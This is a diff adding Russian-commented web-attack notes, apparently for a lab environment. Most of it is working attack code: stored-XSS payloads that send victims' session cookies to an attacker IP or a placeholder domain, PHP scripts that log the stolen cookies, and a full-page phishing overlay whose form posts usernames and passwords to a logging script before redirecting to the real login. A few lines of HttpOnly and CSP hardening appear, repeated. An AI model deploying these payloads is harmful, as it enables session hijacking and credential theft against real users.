@@ -28,3 +28,60 @@ service apache2 restart
 
 Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure
 Header set Content-Security-Policy "default-src 'self';”
+
+
+# фишинговая страница с получением логин пароль
+# в точку входа отправляем фейковую форму
+Оставляем коммент в блоге если все удачно на сервер 192.168.56.101 прилетят куки юзера
+<script>window.location = "http://192.168.56.101/login.php?c=" + document.cookie;</script>
+скрипт login.php:
+
+<?php 
+$logFile = "log.txt"; 
+$cookie = $_REQUEST["c"];
+$handle = fopen($logFile, "a"); 
+fwrite($handle, $cookie . "\n\n"); 
+fclose($handle);
+header("Location: http://www.google.ru/"); 
+
+
+#xss угон session кук
+<script>document.write("<img src='http://your domain
+/xxx?cookie="+document.cookie+"'")</script>
+
+
+защита от xss php.ini
+# session.cookie_httponly = True
+# HttpOnly
+#for nginx
+set_cookie_flag HttpOnly secure;
+# for apache2
+a2enmod headers
+service apache2 restart
+#in default.conf
+
+Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure
+Header set Content-Security-Policy "default-src 'self';”
+
+
+# фишинговая страница с получением логин пароль
+<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" action="http://192.168.0.107/xss-4.php" method=»GET»><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
+# xss-4.php
+
+<?php
+header ('Location: http://192.168.0.103/mutillidae/index.php?page=login.php');
+$handle = fopen("log.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
+
+
+
